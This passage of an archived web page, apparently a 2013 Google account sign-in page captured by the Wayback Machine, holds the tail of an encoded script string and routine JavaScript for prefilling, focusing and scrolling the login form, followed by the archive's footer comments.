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');
  </script>
<script>
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var form = null;
    if (document.getElementById) {
      form = document.getElementById('gaia_loginform');
    }

    if (form && form.Email &&
        (form.Email.value == null || form.Email.value == '')
        && (form.Email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        form.Email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script>
  function gaia_setFocus() {
  var form = null;
  var isFocusableField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
  return true;
  }
  return false;
  };
  var isFocusableErrorField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var hasError = inputElement.className.indexOf('form-error') > -1;
  if (hasError && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  var isFocusableEmptyField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var isEmpty = inputElement.value == null || inputElement.value == '';
  if (isEmpty && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form) {
  var userAgent = navigator.userAgent.toLowerCase();
  var formFields = form.getElementsByTagName('input');
  for (var i = 0; i < formFields.length; i++) {
        var currentField = formFields[i];
        if (isFocusableErrorField(currentField)) {
          currentField.focus();
          
          var currentValue = currentField.value;
          currentField.value = '';
          currentField.value = currentValue;
          return;
        }
      }
      
      
      
        for (var j = 0; j < formFields.length; j++) {
          var currentField = formFields[j];
          if (isFocusableEmptyField(currentField)) {
            currentField.focus();
            return;
          }
        }
      
    }
  }

  
  if (!('ontouchstart' in window)) {
    gaia_attachEvent(window, 'load', gaia_setFocus);
  }
  
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script>
  (function(){
  var signinInput = document.getElementById('signIn');
  gaia_onLoginSubmit = function() {
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  </body>
</html>
<!--
     FILE ARCHIVED ON 08:55:13 Dec 16, 2013 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 23:18:22 Jan 31, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  exclusion.robots: 1.39 (7)
  exclusion.robots.policy: 1.298 (7)
  cdx.remote: 0.641 (7)
  esindex: 0.082 (7)
  LoadShardBlock: 790.645 (24)
  PetaboxLoader3.datanode: 551.181 (25)
  load_resource: 318.449
  PetaboxLoader3.resolve: 272.671
-->